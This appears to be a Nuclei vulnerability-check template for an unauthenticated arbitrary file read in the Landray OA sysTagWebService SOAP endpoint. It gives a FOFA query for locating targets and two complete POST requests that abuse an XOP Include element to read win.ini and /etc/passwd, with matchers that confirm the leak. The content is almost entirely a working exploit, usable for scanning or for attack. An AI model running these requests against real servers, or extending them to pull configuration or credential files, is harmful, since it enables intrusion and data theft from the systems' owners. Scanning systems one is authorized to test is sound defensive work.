id: Landray-WebService-sysTagWebService-File-reading

info:
  name: "蓝凌OA sysTagWebService 接口任意文件读取漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: body="Com_Parameter"
    蓝凌OA系统sysTagWebService WebService接口未实施有效访问控制，攻击者可利用该接口通过构造恶意请求参数实现任意文件读取。该漏洞允许未经授权的远程攻击者获取数据库配置文件、系统配置文件等敏感数据，可能导致系统凭证泄露、数据篡改及服务中断等严重安全风险。
  reference:
  - https://mp.weixin.qq.com/s/lVSOtFdUvCmbZqycAxpKOQ?token=968846615&lang=zh_CN
  tags: 蓝凌OA


http:
- raw:
  - |
    POST /sys/webservice/sysTagWebService HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    Connection: close
    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
    SOAPAction: ""
    Accept-Encoding: gzip, deflate

    ------4upt9dwdca8rtwq9osuz
    Content-Disposition: form-data; name="a"

    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.tag.sys.kmss.landray.com/">
    <soapenv:Header/>
    <soapenv:Body>
        <web:getGroups>
            <arg0>
                <beginTimeStamp>a</beginTimeStamp>
                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
            </arg0>
        </web:getGroups>
    </soapenv:Body>
    </soapenv:Envelope>
    ------4upt9dwdca8rtwq9osuz--

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0'
    - 'Unmarshalling Error: 意外的文本'
    condition: and
  - type: status
    status:
    - 500
- raw:
  - |
    POST /sys/webservice/sysTagWebService HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    Connection: close
    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
    SOAPAction: ""
    Accept-Encoding: gzip, deflate

    ------4upt9dwdca8rtwq9osuz
    Content-Disposition: form-data; name="a"

    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.tag.sys.kmss.landray.com/">
    <soapenv:Header/>
    <soapenv:Body>
        <web:getGroups>
            <arg0>
                <beginTimeStamp>a</beginTimeStamp>
                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></count>
            </arg0>
        </web:getGroups>
    </soapenv:Body>
    </soapenv:Envelope>
    ------4upt9dwdca8rtwq9osuz--
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'cm9vdDov'
    - 'L2Jpbi9iYXNo'
    - 'Unmarshalling Error: 意外的文本'
    condition: and
  - type: status
    status:
    - 500
